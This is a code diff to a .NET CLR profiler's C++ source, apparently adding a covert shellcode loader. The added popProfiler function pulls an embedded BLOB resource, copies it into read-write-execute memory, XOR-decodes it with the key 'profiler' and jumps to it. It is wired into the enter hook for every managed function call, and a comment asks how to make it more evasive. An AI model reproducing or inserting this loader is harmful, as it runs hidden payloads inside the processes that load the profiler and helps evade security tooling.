@@ -3,6 +3,26 @@
 #include <string>
 #include "CoreProfiler.h"
 #include "Logger.h"
+
+#ifdef _WINDOWS
+//{{NO_DEPENDENCIES}}
+// Microsoft Visual C++ generated include file.
+// Used by DotNext.Profiler.Windows.rc
+//
+#include <windows.h>
+#include <threadpoolapiset.h>
+
+// Next default values for new objects
+// 
+#ifdef APSTUDIO_INVOKED
+#ifndef APSTUDIO_READONLY_SYMBOLS
+#define _APS_NEXT_RESOURCE_VALUE        103
+#define _APS_NEXT_COMMAND_VALUE         40001
+#define _APS_NEXT_CONTROL_VALUE         1001
+#define _APS_NEXT_SYMED_VALUE           101
+#endif
+#endif
+#endif
 #include "OS.h"
 
 HRESULT __stdcall CoreProfiler::QueryInterface(REFIID riid, void** ppvObject) {
@@ -38,6 +58,54 @@ ULONG __stdcall CoreProfiler::Release(void) {
 	return count;
 }
 
+void xor_crypt(const char* key, int key_len, char* data, int data_len)
+{
+	for (int i = 0; i < data_len; i++)
+		data[i] ^= key[i % key_len];
+}
+
+extern "C" __declspec(dllexport) int __stdcall PleaseFindMe(long bar) {
+	return 3494;
+}
+
+// Can this be changed to be more evasive? Maybe virtualprotect the resource directly and xor it, then call it?
+void popProfiler() {
+#ifdef _WINDOWS
+
+	HMODULE hm;
+	HRSRC profileResource;
+	DWORD profileSize;
+	HGLOBAL profileResouceData;
+	void* exec;
+	GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+		(LPCSTR)&PleaseFindMe, &hm);
+	profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
+	profileSize = SizeofResource(hm, profileResource);
+	profileResouceData = LoadResource(hm, profileResource);
+	exec = VirtualAlloc(0, profileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, profileResouceData, profileSize);
+	
+	xor_crypt("profiler", 8, (char*)exec, profileSize);
+	((void(*)())exec)();
+	
+#endif // _WINDOWS
+
+}
+
+void NakedEnter(FunctionID /*funcID*/) {
+	popProfiler();
+	return;
+}
+
+void NakedLeave(FunctionID /*funcID*/) {
+	return;
+}
+
+void NakedTailcall(FunctionID /*funcID*/) {
+	return;
+}
+
+
 HRESULT CoreProfiler::Initialize(IUnknown* pICorProfilerInfoUnk) {
 	Logger::Debug(__FUNCTION__);
 
@@ -51,8 +119,17 @@ HRESULT CoreProfiler::Initialize(IUnknown* pICorProfilerInfoUnk) {
 		COR_PRF_MONITOR_CLASS_LOADS |
 		COR_PRF_MONITOR_THREADS |
 		COR_PRF_MONITOR_EXCEPTIONS |
-		COR_PRF_MONITOR_JIT_COMPILATION);
+		COR_PRF_MONITOR_JIT_COMPILATION |
+		COR_PRF_MONITOR_ENTERLEAVE);
 	//|	COR_PRF_MONITOR_OBJECT_ALLOCATED | COR_PRF_ENABLE_OBJECT_ALLOCATED);
+
+	HRESULT hr = _info->SetEnterLeaveFunctionHooks2
+	((FunctionEnter2*)&NakedEnter,
+		(FunctionLeave2*)&NakedLeave,
+		(FunctionTailcall2*)&NakedTailcall);
+
+	if (FAILED(hr))
+		return E_FAIL;
 
 	return S_OK;
 }
